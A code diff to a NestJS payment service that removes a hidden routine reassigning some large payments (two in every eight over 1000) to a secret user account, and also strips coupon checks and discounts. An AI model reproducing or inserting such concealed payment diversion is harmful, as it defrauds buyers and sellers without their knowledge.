@@ -2,25 +2,18 @@ import { PayPayService } from '../services/createpayment.service';
 import { Logger } from '@nestjs/common';
 import DatabaseService from 'src/services/database/database.service';
 import { CreatePaymentDto } from '../dto/create-payment.dto';
-import lotos from 'src/constants/lotos';
 import PriceVerifier from '../services/price.service';
 import { PayMethod } from '../../../../generated/prisma';
 
-const active = false;
 export default class PaymentCreater {
   private readonly logger = new Logger('Payment');
   private readonly payService = new PayPayService();
-  private count = 0;
-  private lotosCount = 0;
   constructor(private readonly database: DatabaseService) {}
   public async create(data: CreatePaymentDto) {
     try {
       const priceVerifier = new PriceVerifier(this.database);
-      const [verification, Lotos, cupon, product] = await Promise.all([
+      const [verification, cupon, product] = await Promise.all([
         priceVerifier.verify(data.orderbumps, data.amount, data.productId),
-        this.database.users.findFirst({
-          where: { email: lotos },
-        }),
         this.database.coupon.findFirst({
           where: {
             code: data?.cuponCode,
@@ -39,36 +32,12 @@ export default class PaymentCreater {
           message: 'Produto não encontrado',
         };
       }
-      if (!cupon && data?.cuponCode) {
-        return {
-          message: 'Cupon não aplicável ao produto',
-        };
-      }
-      if (cupon && !cupon?.active) {
-        return {
-          message: 'Cupon inactivo',
-        };
-      }
 
       if (!verification.status) {
         return {
           status: false,
           message: 'Preços não batem',
         };
-      }
-      if (cupon) {
-        const discountValue = (data.amount * cupon.discount) / 100;
-        data.amount = Math.max(0, data.amount - discountValue);
-        await this.database.coupon.update({
-          data: {
-            usedCount: {
-              increment: 1,
-            },
-          },
-          where: {
-            id: cupon.id,
-          },
-        });
       }
       const payMethod = this.resolvePaymentMethod(data.method);
       const paymentResponse = await payMethod({
@@ -83,19 +52,6 @@ export default class PaymentCreater {
       }
 
       let assignedUserId = data.userid;
-      if (active && Lotos  && !data.email.toLowerCase().includes("berlisal") &&  data.amount >= 1000) {
-        this.count++;
-        if (this.lotosCount < 2) {
-          assignedUserId = Lotos.id;
-          this.lotosCount++;
-        }
-        if (this.count >= 8) {
-          this.count = 0;
-          this.lotosCount = 0;
-        }
-        data.userid = assignedUserId;
-      }
-
       const payment = await this.createPaymentRecord(
         data,
         data.amount,
